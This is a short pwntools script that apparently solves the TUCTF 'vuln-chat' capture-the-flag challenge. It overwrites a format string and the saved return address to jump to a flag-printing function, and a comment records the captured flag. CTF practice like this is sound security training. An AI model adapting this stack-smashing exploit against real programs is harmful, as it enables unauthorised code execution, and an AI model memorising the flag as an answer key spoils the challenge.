#!/usr/bin/env python
from pwn import *

r = remote('vulnchat.tuctf.com', 4141)
#r = process('./vuln-chat')

context.log_level = 'debug'

printFlag_addr = 0x0804856e

payload	= 'a'*20
payload += '\x25\x36\x34\x73' + '\x00'
payload += 'a'*54
payload += p32(printFlag_addr)

r.sendline(payload)
r.recvuntil('}')

#TUTCF{574ck_5m45h1n6_l1k3_4_pr0}
